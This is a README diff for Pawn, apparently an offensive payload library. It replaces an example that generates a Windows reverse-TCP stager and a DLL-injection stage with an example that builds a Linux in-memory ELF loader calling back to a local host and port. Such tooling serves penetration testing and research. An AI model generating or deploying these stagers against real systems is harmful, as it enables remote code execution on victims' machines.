@@ -16,15 +16,19 @@ pip3 install git+https://github.com/EntySec/Pawn
 
 ## Examples
 
-Example of preparing stage0 and stage1 (which is DLL) for Windows x86.
+Example of using ELF in-memory loader (using procfs technique [described here](https://entysec.github.io/2023-04-02-remote-elf-loading/)).
 
 ```python
-from pawn.windows.x86 import ReverseTCP, Bootstrap
+from pawn.linux.x64 import Loader
 
-stage0 = ReverseTCP().generate_reverse_tcp()
-stage1 = Bootstrap().inject_dll("/tmp/pwny.dll")
+loader = Loader()
 
-print(len(stage0), len(stage1))
+stage = loader.procfs_loader(
+    host='127.0.0.1',
+    port=8888,
+)
+
+print(len(stage))
 ```
 
 ## Special Thanks
